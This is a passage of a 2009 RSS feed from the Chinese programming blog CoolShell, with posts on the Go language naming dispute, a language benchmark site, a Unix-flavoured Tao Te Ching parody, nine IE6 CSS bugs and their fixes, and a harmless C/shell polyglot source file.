<p><span style="color: #ff0000;"><span style="color: #000000;">（全文完）</span></span></p>
 ]]></content>
<pubDate>2009-11-12T08:31:25+08:00</pubDate>
<guid>https://coolshell.cn/articles/1761.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Go语言更名Issue 9？ ]]></title>
<link>https://coolshell.cn/articles/1781.html</link>
<content><![CDATA[ 
<p>Go语言出了一个Issue，这个Issue的链接在这里：<a href="https://code.google.com/p/go/issues/detail?id=9">http://code.google.com/p/go/issues/detail?id=9</a> ，这个Issue的编号是9描述是：</p>
<blockquote><p><span>I have already used the name for *MY* programming language</span></p></blockquote>
<p>意思是，已经有人使用了这go作为其语言的命名了。报告者叫fmccabe，他说到：</p>
<blockquote><p><span>我已经从事于我的一个编程语言，而且都10年了。并且都有很多论文发表了。我非常感激你们Google如果把这个名字修改一下，因为我是不会修改我的语言的名字的！</span></p></blockquote>
<p><span>于是，开始了回贴：</span></p>
<ul>
<li>1楼跟贴说，“给个链接看看”</li>
<li>fmccabe在2楼说：“我出版了本书在lulu.com上”。</li>
<li>3楼的说，“是的，你的语言叫“Go!”，你的书在：<a href="http://www.lulu.com/content/paperback-book/lets-go/641689">http://www.lulu.com/content/paperback-book/lets-go/641689</a>”</li>
<li>4楼说：“三楼你是对的，LZ的语言是‘Let’s Go!’或‘Go!’，Google的叫‘go’，根本就不同啊。”</li>
<li>LZ不同意在5楼说：“是的，我的语言叫Go!，书名叫：Let’s Go!。而这里的问题不是Google的go是否会有名，而是公平性。”</li>
</ul>
<p><span>好事者从来都不少，后面的贴子可想而知了。众多网友纷纷支持LZ，让Google改名。</span></p>
<ul>
<li><span>11楼让LZ找个便宜的律师，还说Google的钱袋很深的。</span></li>
<li><span>14楼的DailyFinance.com的一个MS记者的人也找上了。</span></li>
<li><span>17楼建议Google改名Goo 或Foo</span></li>
</ul>
<p><span>于是，再往后的回贴，众网友们开始纷纷帮Google的go语言改名：<br>
<span id="more-1781"></span></span></p>
<ul>
<li>25楼说，Goo也被用了。</li>
<li>28楼说，应该叫GOOP = Google Object Oriented Programming</li>
<li>29楼说，叫ogle</li>
<li>30楼说，叫Goat</li>
<li>31楼说，JAgo: Just Another go （42楼说，Jago也被用了）</li>
<li>36楼说，go2。并说明，C++也使用了C的名字，用++做了后缀。所以，可以go2</li>
<li>40楼说，为什么不叫Golang?Erlang – “Ericsson Language”和Golang – “Google Language”，多配啊。</li>
<li>50楼说，干脆叫“Do”得了。</li>
<li>53楼说，叫gone也可以啊。</li>
<li>69楼说，大家别吵了，这是go的第9个issue，叫Issue 9最好。</li>
</ul>
<p>后面的网友们纷纷支持Issue 9，<strong>Issue 9</strong>的呼声最高。截止本文发表，大约有710个跟贴，在<a href="https://www.reddit.com/r/programming/comments/a351z/oohhhh_snap_i_have_already_used_the_name_go_for/" target="_blank">reddit.com</a>上也在580多个。网友的力量就是大啊。</p>
<p>星期五了，耗子祝大家周末快乐！</p>
 ]]></content>
<pubDate>2009-11-13T13:37:11+08:00</pubDate>
<guid>https://coolshell.cn/articles/1781.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序语言性能比拼 ]]></title>
<link>https://coolshell.cn/articles/1788.html</link>
<content><![CDATA[ 
<p><a href="https://coolshell.cn/wp-content/uploads/2009/11/govsgnuc.jpg"></a><a href="https://coolshell.cn/wp-content/uploads/2009/11/govsgnuc.jpg"></a><a href="https://coolshell.cn/wp-content/uploads/2009/11/govsgnuc.jpg"></a> <a href="https://coolshell.cn/wp-content/uploads/2009/11/measurements_table.jpg"></a> 下面这个网页，你可以比较各种程序语言的性能：</p>
<p style="text-align: center;"><a href="http://shootout.alioth.debian.org/u64/index.php">http://shootout.alioth.debian.org/u64/index.php</a></p>
<p style="text-align: left;">这个页面，安装的是x64 Ubuntu，CPU是Intel® Q6600® 单核。这个网页支持的语言很多，什么C，C++，Java，python，PHP，Erlang，C#，Ruby，……，还有最新的G0语言。</p>
<p style="text-align: left;">在主页上，你可以选择一个语言。比如，我们选择Google的Go语言——Go 6g8g，然后，点击Show按钮，于是，你会看到下面这个界面：</p>
<p style="TEXT-ALIGN: center"><a href="https://coolshell.cn/wp-content/uploads/2009/11/govsgnuc.jpg"><img alt="image placeholder" ></a> <a href="https://coolshell.cn/wp-content/uploads/2009/11/govsgnuc.jpg"></a><a href="https://coolshell.cn/wp-content/uploads/2009/11/govsgnuc.jpg"></a></p>
<p style="text-align: left;">在这个界面上方，你可以选择两种语言，我们选择的是，上面的是Go 6g8g，而下面是的GNU C，于是下面的图表，是这两个语言各种参数和算法的比较图表。</p>
<p style="text-align: left;"><span id="more-1788"></span></p>
<p style="text-align: left;">在这个图表中，其实就是“Go的性能” 除以 “C的性能”，所以，</p>
<ul>
<li>
<div style="text-align: left;">如果柱状图是大于1的（也就是基线以上的）则说明Go的性能不如C。</div>
</li>
<li>
<div style="text-align: left;">如果柱状图小于1的（也就是基线以下的），说明Go的性能超过了C。</div>
</li>
</ul>
<p style="text-align: left;">再往下，是用来做比较的算法的图表，如下所示。在这个表中，我们可以看到很多算法，单击语言的链接，你就可以看到具体的实现源代码了。</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2009/11/measurements_table.jpg"></a></p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2009/11/measurements_table.jpg"><img alt="image placeholder" ></a></p>
<p style="text-align: left;"> （全文完）</p>
<p></p>
 ]]></content>
<pubDate>2009-11-16T08:20:17+08:00</pubDate>
<guid>https://coolshell.cn/articles/1788.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 超强：Unix道德经(英文版) ]]></title>
<link>https://coolshell.cn/articles/1794.html</link>
<content><![CDATA[ 
<p style="text-align: left;"><strong>主页：</strong><a href="http://mercury.ccil.org/~cowan/upc/"><strong>http://mercury.ccil.org/~cowan/upc/</strong></a></p>
<p style="text-align: left;">这是一个人主页，博主说，这是一个“黑客式”版本的 <cite><a href="https://www.google.com/search?q=%22Tao+Te+Ching%22">Dao De Ching</a></cite> (字面理解是”way power classic”，道路权力名著).他并对中文其实并不懂。他只是为Jonathan Star的 <a href="https://www.amazon.com/exec/obidos/ASIN/1585420999">逐字翻译</a> 而工作，其使用了在线的中文一个词典 <a href="http://zhongwen.com/dao.htm"><em>zhongwen.com</em></a>对《道德经》一字一字地翻译。</p>
<p style="text-align: left;">他对《道德经》并不是很懂，除了知道那是中文，而且知道这是一个相当老的，而且，2500年前的那些是非常喜欢的一个作品，正如 <a href="http://www.ursulakleguin.com/">Ursula K. LeGuin</a> 在 <a href="https://www.amazon.com/exec/obidos/ASIN/1570623953">她的版本</a>中所说的一样。作者说《道德经》是对道德，政治和宗教信仰做了很多的解释。到了今天，还有人在读这本书，说明了这本书的不朽，美妙和意味深长。</p>
<p style="text-align: left;">下面是《道德经》的 81 个章节 ，作者并没有完全写完（或者说是hack完），你可以点击链接查看其中的内容。</p>
<p style="text-align: center;"><a href="http://mercury.ccil.org/~cowan/upc/01.txt">01</a> 02 03 <a href="http://mercury.ccil.org/~cowan/upc/04.txt">04</a> 05 06 <a href="http://mercury.ccil.org/~cowan/upc/07.txt">07</a> <a href="http://mercury.ccil.org/~cowan/upc/08.txt">08</a> <a href="http://mercury.ccil.org/~cowan/upc/09.txt">09</a><br>
10 11 12 13 14 <a href="http://mercury.ccil.org/~cowan/upc/15.txt">15</a> 16 <a href="http://mercury.ccil.org/~cowan/upc/17.txt">17</a> <a href="http://mercury.ccil.org/~cowan/upc/18.txt">18</a><br>
19 20 <a href="http://mercury.ccil.org/~cowan/upc/21.txt">21</a> 22 <a href="http://mercury.ccil.org/~cowan/upc/23.txt">23</a> 24 25 26 27<br>
<a href="http://mercury.ccil.org/~cowan/upc/28.txt">28</a> 29 30 31 32 33 <a href="http://mercury.ccil.org/~cowan/upc/34.txt">34</a> 35 36<br>
37 38 <a href="http://mercury.ccil.org/~cowan/upc/39.txt">39</a> <a href="http://mercury.ccil.org/~cowan/upc/40.txt">40</a> <a href="http://mercury.ccil.org/~cowan/upc/41.txt">41</a> <a href="http://mercury.ccil.org/~cowan/upc/42.txt">42</a> <a href="http://mercury.ccil.org/~cowan/upc/43.txt">43</a> 44 45<br>
46 47 <a href="http://mercury.ccil.org/~cowan/upc/48.txt">48</a> 49 50 51 52 <a href="http://mercury.ccil.org/~cowan/upc/53.txt">53</a> 54<br>
55 56 <a href="http://mercury.ccil.org/~cowan/upc/57.txt">57</a> 58 59 <a href="http://mercury.ccil.org/~cowan/upc/60.txt">60</a> 61 62 <a href="http://mercury.ccil.org/~cowan/upc/63.txt">63</a><br>
64 <a href="http://mercury.ccil.org/~cowan/upc/65.txt">65</a> 66 <a href="http://mercury.ccil.org/~cowan/upc/67.txt">67</a> <a href="http://mercury.ccil.org/~cowan/upc/68.txt">68</a> 69 70 <a href="http://mercury.ccil.org/~cowan/upc/71.txt">71</a> <a href="http://mercury.ccil.org/~cowan/upc/72.txt">72</a><br>
73 74 75 76 77 78 <a href="http://mercury.ccil.org/~cowan/upc/79.txt">79</a> 80 <a href="http://mercury.ccil.org/~cowan/upc/81.txt">81</a></p>
<p style="text-align: left;">点击第23章，可以看到hack版的充满Unix术语的经文翻译。下面给出原文和转译版的对照。（老实说，翻译的怎是一个强字了得啊）下面给出中英对照版。</p>
<p><span id="more-1794"></span><br>
</p>
<center>
<table style="text-align: center;" border="1">
<tbody>
<tr>
<td><strong>中文原文</strong></td>
<td><strong>英文Hack版</strong></td>
</tr>
<tr>
<td>
<p style="text-align: left;">希言自然。</p>
<p style="text-align: left;">故飘风不终朝，<br>
骤雨不终日。<br>
孰为此者﹖<br>
天地。</p>
<p style="text-align: left;">天地尚不能久，<br>
而况于人乎﹖</p>
<p>故从事于道者，</p>
<p style="text-align: left;">道者同于道，<br>
德者同于德，<br>
失者同于失。</p>
<p style="text-align: left;">同于道者，<br>
道亦乐得之；<br>
同于德者，<br>
德亦乐得之；<br>
同于失者，<br>
失亦乐得之。</p>
<p style="text-align: left;">信不足焉，<br>
有不信焉。</p>
</td>
<td>
<p style="text-align: left;">A few words about the matter:</p>
<p style="text-align: left;">Flames don’t outlast the message,<br>
Flamewars don’t outlast the thread.<br>
What are the causes of these?<br>
The total system.</p>
<p style="text-align: left;">If the works of the total system<br>
can’t last forever,<br>
how much less can anyone else’s, in fact?</p>
<p style="text-align: left;">So do business with Unix people.</p>
<p style="text-align: left;">Unix people are one with Unix,<br>
Power people are one with Power,<br>
(Lusers are one with Lossage.)</p>
<p style="text-align: left;">Being one with Unix people,<br>
Unix must be happy with them.<br>
Power too is happy with them.<br>
(Even being one with lusers counts.)</p>
<p style="text-align: left;">Trusting’s not enough, in fact;<br>
Having’s not trusting, either.</p>
</td>
</tr>
</tbody>
</table>
<p></p>
</center>
<br>
我相信这不是恶搞，但面对这样的事情——“老子”，“道德经”，“ Unix”和“英文”的和谐统一体，我无法不服啊。
 ]]></content>
<pubDate>2009-11-16T09:30:26+08:00</pubDate>
<guid>https://coolshell.cn/articles/1794.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 在上班的时候浏览不相干网页 ]]></title>
<link>https://coolshell.cn/articles/1808.html</link>
<content><![CDATA[ 
<p>相信大家在上班的时候都要去浏览很多与工作无关的网页，但总是害怕被同事尤其是老板看到，所以，你总是会有个“老板键”什么的。当有人从你身边经过的时候，你会很快速地切换你的桌面屏幕，让人看到你还在干与工作有关的事情了。</p>
<p>现在，一个具有创意的天才解决方案出来了——为什么不把这些与工作无关的网站的样子都变成和工作相关呢？这里有一个示例，真让人拍案叫绝。不知道大家知不知道一个叫<a href="http://www.fmylife.com/" target="_blank">http://www.fmylife.com/</a>的网站？这个网站上都是一些“令人难堪”的小笑话，很多是荤的笑话，而有另一个网站是：<a href="http://fml.madsravn.dk/">http://fml.madsravn.dk/</a>——这个网站就是fmylife的翻版，唯一不同的是，它把fmylife.com伪装成了一个Java 2 Platform SE v1.42的技术文档（请注意这个文档中的函数解释的内容），于是你就可以在上班的时候大胆地浏览fmylife.com上的内容了，因为那看起来就像在看Java的API文档。呵呵。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p></p>
 ]]></content>
<pubDate>2009-11-16T13:19:53+08:00</pubDate>
<guid>https://coolshell.cn/articles/1808.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 9个最常见IE的Bug及其fix ]]></title>
<link>https://coolshell.cn/articles/1817.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" ></p>
<p>Internet Explorer – Web程序员的毒药。在IE上开发时间中有超过60%的时间是花在和IE的bug进行搏斗，让你的开发生产率严重下降。下面是一个教程，告诉你9个IE上最常见的BUG以及如何解决它们。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#1_%E5%B1%85%E4%B8%AD%E5%B8%83%E5%B1%80" title="1. 居中布局">1. 居中布局</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#2_%E6%A5%BC%E6%A2%AF%E5%BC%8F%E7%9A%84%E6%95%88%E6%9E%9C" title="2. 楼梯式的效果">2. 楼梯式的效果</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#3_float%E5%85%83%E4%BB%B6%E7%9A%84%E4%B8%A4%E5%80%8D%E7%A9%BA%E7%99%BD" title="3. float元件的两倍空白">3. float元件的两倍空白</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#4_%E6%97%A0%E6%B3%95%E8%AE%BE%E7%BD%AE%E5%BE%AE%E5%9E%8B%E9%AB%98%E5%BA%A6" title="4. 无法设置微型高度">4. 无法设置微型高度</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#5_%E8%B7%A8%E5%87%BA%E8%BE%B9%E7%95%8C" title="5. 跨出边界">5. 跨出边界</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#6_Fixing_the_Broken_Box_Model" title="6. Fixing the Broken Box Model">6. Fixing the Broken Box Model</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#7_%E8%AE%BE%E7%BD%AEmin-height%E5%92%8Cmin-width" title="7. 设置min-height和min-width">7. 设置min-height和min-width</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#8_Float_%E5%B8%83%E5%B1%80%E9%94%99%E8%AF%AF%E8%A1%8C%E4%B8%BA_Misbehaving" title="8. Float 布局错误行为 Misbehaving">8. Float 布局错误行为 Misbehaving</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#9_%E5%9C%A8list%E9%A1%B9%E7%9B%AE%E9%97%A8%E7%9A%84%E7%A9%BA%E8%A1%8C" title="9. 在list项目门的空行">9. 在list项目门的空行</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#%E7%BB%93%E8%AE%BA" title="结论">结论</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="1_%E5%B1%85%E4%B8%AD%E5%B8%83%E5%B1%80"></span>1. 居中布局<span class="ez-toc-section-end"></span>
</h4>
<p>创建一个CSS定义把一个元素放到中间的位置，可能是每一个Web开发人员都会做的事情。最简单的做法是为你的元素增加一个<em>margin: auto;</em> ，然而 IE 6.0 会出现很多奇怪的行为。让我们来看一个例子。</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#container{
	border: solid 1px #000;
	background: #777;
	width: 400px;
	height: 160px;
	margin: 30px 0 0 30px;
}

#element{
	background: #95CFEF;
	border: solid 1px #36F;
	width: 300px;
	height: 100px;
	margin: 30px auto;

}
</pre>
<p>下面是我们所期望的输出：</p>
<p><span id="more-1817"></span></p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>但IE却给我们这样的输出：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>这应该是IE 6对margin的 <em>auto</em> 并没有正确的设置。但幸运的是，这是很容易被修正的。</p>
<p><strong>解决方法</strong></p>
<p>最简单的方法是在父元件中使用 <em>text-align: center</em> 属性，而在元件中使用 <em>text-align: left</em> 。</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#container{
	border: solid 1px #000;
	background: #777;
	width: 400px;
	height: 160px;
	margin: 30px 0 0 30px;
	text-align: center;
}

#element{
	background: #95CFEF;
	border: solid 1px #36F;
	width: 300px;
	height: 100px;
	margin: 30px 0;
    	text-align: left;

}
</pre>
<h4>
<span class="ez-toc-section" id="2_%E6%A5%BC%E6%A2%AF%E5%BC%8F%E7%9A%84%E6%95%88%E6%9E%9C"></span>2. 楼梯式的效果<span class="ez-toc-section-end"></span>
</h4>
<p>几乎所有的Web开发者都会使用list来创建导航条。下面是你可能会用到的代码：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">    &lt;ul&gt;
        &lt;li&gt;&lt;a href="#"&gt;&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href="#"&gt;&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href="#"&gt;&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">ul {
    list-style: none;
}

ul li a {
   	display: block;
   	width: 130px;
	height: 30px;
   	text-align: center;
   	color: #fff;
   	float: left;
	background: #95CFEF;
	border: solid 1px #36F;
	margin: 30px 5px;
}
</pre>
<p>一个符合标准的浏览器会是下面这样：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>但IE却是这样的：</p>
<p><img alt="image placeholder" ></p>
<p>下面是两个解决方法</p>
<p><b>解决方法一</b></p>
<p>设置li元件的float属性。</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">ul li {
	float: left;
}
</pre>
<p><strong>解决方法二</strong></p>
<p>设置 <em>display: inline</em> 属性。</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">ul li {
	display: inline
}
</pre>
<h4>
<span class="ez-toc-section" id="3_float%E5%85%83%E4%BB%B6%E7%9A%84%E4%B8%A4%E5%80%8D%E7%A9%BA%E7%99%BD"></span>3. float元件的两倍空白<span class="ez-toc-section-end"></span>
</h4>
<p>请看下面的代码：</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element{
	background: #95CFEF;
	width: 300px;
	height: 100px;
	float: left;
	margin: 30px 0 0 30px;
	border: solid 1px #36F;
}
</pre>
<p>期望的结果是：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>IE的结果是：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p><strong>解决方案</strong></p>
<p>和上面那个BUG的解决方案一样，设置 <em>display: inline</em> 属性可以解决问题。</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element{
	background: #95CFEF;
	width: 300px;
	height: 100px;
	float: left;
	margin: 30px 0 0 30px;
	border: solid 1px #36F;
   	display: inline;
}
</pre>
<h4>
<span class="ez-toc-section" id="4_%E6%97%A0%E6%B3%95%E8%AE%BE%E7%BD%AE%E5%BE%AE%E5%9E%8B%E9%AB%98%E5%BA%A6"></span>4. 无法设置微型高度<span class="ez-toc-section-end"></span>
</h4>
<p>我们发现在IE中使用 <em>height: XXpx</em> 这样的属性无法设置比较小的高度。下面是个例子（注意高度是2px）：</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element{
	background: #95CFEF;
	border: solid 1px #36F;
	width: 300px;
	height: 2px;
	margin: 30px 0;
}
</pre>
<p>期望结果： 2px的元件加1px的边框.</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>IE的结果：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p><strong>解决方案一</strong></p>
<p>这个BUG的产生原因很简单，IE不允许元件的高度小于字体的高度，所以，下面的fix是设置上字体大小。</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element{
	background: #95CFEF;
	border: solid 1px #36F;
	width: 300px;
	height: 2px;
	margin: 30px 0;
    	font-size: 0;
}
</pre>
<p><strong>解决方案二</strong></p>
<p>但是最佳的解决方法是使用 <em>overflow: hidden</em> 。</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element{
	background: #95CFEF;
	border: solid 1px #36F;
	width: 300px;
	height: 2px;
	margin: 30px 0;
    	overflow: hidden
}
</pre>
<h4>
<span class="ez-toc-section" id="5_%E8%B7%A8%E5%87%BA%E8%BE%B9%E7%95%8C"></span>5. 跨出边界<span class="ez-toc-section-end"></span>
</h4>
<p>这个BUG是很难看的。当父元件中使用了 <em>overflow</em> 的 <em>auto</em> 属性，并且在其里放入相关元件。你会看来里面的元件会跨出来。下面是一个示例：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;div id="element"&gt;&lt;div id="anotherelement"&gt;&lt;/div&gt;&lt;/div&gt;
</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element{
	background: #95CFEF;
	border: solid 1px #36F;
	width: 300px;
	height: 150px;
	margin: 30px 0;
	overflow: auto;
}

#anotherelement{
	background: #555;
	width: 150px;
	height: 175px;
	position: relative;
	margin: 30px;
}
</pre>
<p>期望的结果：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>IE的结果：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p><strong>解决方法</strong></p>
<p>设置 position: relative;属性</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element{
	background: #95CFEF;
	border: solid 1px #36F;
	width: 300px;
	height: 150px;
	margin: 30px 0;
	overflow: auto;
    	position: relative;
}
</pre>
<h4>
<span class="ez-toc-section" id="6_Fixing_the_Broken_Box_Model"></span>6. Fixing the Broken Box Model<span class="ez-toc-section-end"></span>
</h4>
<p>Internet Explorer曲解了“盒子模子”可能是最不可原谅的事情了。IE 6 这个半标准的浏览器回避了这个事情，但这个问题还是会因为IE运行在“怪异模式”下出现。</p>
<p>两个Div元件。一个是有fix的，一个是没有的。而他们不同的高和宽加上padding的总合却是不一样的。下图的上方是被修正的，下方则没有。</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p><strong>解决方法</strong></p>
<p>我相信这个事情即不需要解释也不需要演示，这应该是大多数人都明白的。下面是一个很相当怪异的解决方案</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element{
	width: 400px;
    	height: 150px;
	padding: 50px;
}
</pre>
<p>上面的定义也就是说：</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element {
    width: 400px;
    height: 150px;
   \height: 250px;
   \width: 500px
}
</pre>
<p>是的，你要原来的长和宽上加上了padding。但这个fix只会作用于IE了的“怪异模式”，所以你不需要担心在IE6的正常模式下会有问题。</p>
<h4>
<span class="ez-toc-section" id="7_%E8%AE%BE%E7%BD%AEmin-height%E5%92%8Cmin-width"></span>7. 设置min-height和min-width<span class="ez-toc-section-end"></span>
</h4>
<p>IE忽略了min-height。</p>
<p><strong>解决方法一</strong></p>
<p>这个fix由 <a href="http://www.dustindiaz.com/min-height-fast-hack/">Dustin Diaz</a>提供。其利用了 <em>!important</em> 下面是代码片段：</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element {
  min-height:150px;
  height:auto !important;
  height:150px;
}
</pre>
<p><strong>解决方法二</strong></p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element {
    min-height: 150px;
    height: 150px;
}

html&gt;body #element {
	height: auto;
}
</pre>
<h4>
<span class="ez-toc-section" id="8_Float_%E5%B8%83%E5%B1%80%E9%94%99%E8%AF%AF%E8%A1%8C%E4%B8%BA_Misbehaving"></span>8. Float 布局错误行为 Misbehaving<span class="ez-toc-section-end"></span>
</h4>
<p>使用无table的布局最重要的就是使用CSS的float元件。在很多情况下，IE6处理起来好像在摸索阶段，有些时候，你会发现很多奇怪的行为。比如在其中有一些文本的时候。</p>
<p>来看一下下面这个示例：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;div id="container"&gt;
	&lt;div id="element"&gt;http://net.tutsplus.com/&lt;/div&gt;
	&lt;div id="anotherelement"&gt;&lt;/div&gt;
&lt;/div&gt;
</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element, #anotherelement{
	background: #95CFEF;
	border: solid 1px #36F;
	width: 100px;
	height: 150px;
	margin: 30px;
	padding: 10px;
	float: left;
}

#container{
	background: #C2DFEF;
	border: solid 1px #36F;
	width: 365px;
	margin: 30px;
	padding: 5px;
	overflow: auto;
}
</pre>
<p>期望结果：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>IE的结果：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>你可以看到其中的不同了</p>
<p><strong>解决方法</strong></p>
<p>要解决这个问题没有什么好的方法。只有一个方法，那就是使用 <em>overflow: hidden</em> 。</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">#element{
	background: #C2DFEF;
	border: solid 1px #36F;
	width: 365px;
	margin: 30px;
	padding: 5px;
	overflow: hidden;
}
</pre>
<h4>
<span class="ez-toc-section" id="9_%E5%9C%A8list%E9%A1%B9%E7%9B%AE%E9%97%A8%E7%9A%84%E7%A9%BA%E8%A1%8C"></span>9. 在list项目门的空行<span class="ez-toc-section-end"></span>
</h4>
<p>先看下面的例子</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;ul&gt;
 &lt;li&gt;&lt;a href="#"&gt;Link 1&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#"&gt;Link 2&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="#"&gt;Link 3&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">ul {
	margin:0;
	padding:0;
	list-style:none;
}

li a {
	background: #95CFEF;
	display: block;
}
</pre>
<p>期望结果：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>IE的结果：</p>
<div class="tutorial_image"><img alt="image placeholder" ></div>
<p>Fortunately, there are a plethora of fixes you could try.</p>
<p><strong>解决方法一</strong></p>
<p>定义height来解决</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">li a {
	background: #95CFEF;
	display: block;
    	height: 200px;
}
</pre>
<p><strong>解决方法二</strong></p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">li a {
	background: #95CFEF;
	float: left;
    	clear: left;
}
</pre>
<p><strong>解决方法三</strong></p>
<p>为 <em>li</em> 加上<em>display: inline</em>。</p>
<p></p>
<pre data-enlighter-language="css" class="EnlighterJSRAW">li {
	display: inline;
}
</pre>
<h4>
<span class="ez-toc-section" id="%E7%BB%93%E8%AE%BA"></span>结论<span class="ez-toc-section-end"></span>
</h4>
<p>调界面是一件很难的事，调一个CSS的HTML界面是一件更难的事，在IE下调一个CSS的HTML界面是难上加难的事。</p>
<p>文章：<a href="http://net.tutsplus.com/tutorials/html-css-techniques/9-most-common-ie-bugs-and-how-to-fix-them/" target="_blank">来源</a></p>
 ]]></content>
<pubDate>2009-11-17T15:33:02+08:00</pubDate>
<guid>https://coolshell.cn/articles/1817.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C语言和sh脚本的杂交代码 ]]></title>
<link>https://coolshell.cn/articles/1824.html</link>
<content><![CDATA[ 
<p>在网上看到了一个把 C语言和bash杂并起来的例子，这个示子如下所示。在下面这个例子中，我们把脚本用#if 0这个预编译给起来，这样就不会让其编译到C语言中了。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#if 0
echo "Hello from bash!"
exit
#endif
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
int main(int argc, char* argv[]) {
  puts("Hello from C!");
  return EXIT_SUCCESS;
}</pre>
<p>下面，让我看看如果来使用这样的程序：</p>
<p>[bash]$ sh test.sh.c<br>
Hello from bash!<br>
$ gcc test.sh.c -o test<br>
$ ./test<br>
Hello from C!<br>
[/bash]</p>
<p>你甚至还可以做一个自我编译，并自我运行的源代码。如下所示：</p>
<p><span id="more-1824"></span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#if 0
file=`mktemp`
gcc -o $file $0
$file
rm $file
exit
#endif
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char *argv[]) {
  puts("Hello from C!");
  return EXIT_SUCCESS;
}</pre>
<p>运行：</p>
<p>[bash]$ sh test.sh.c<br>
Hello from C!<br>
$[/bash]</p>
<p>当然，我并不建议你在真正的开发环境中这样使用，我只不过是在介绍一个比较有趣的用法，仅此而已！</p>
 ]]></content>
<pubDate>2009-11-19T13:47:51+08:00</pubDate>
<guid>https://coolshell.cn/articles/1824.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
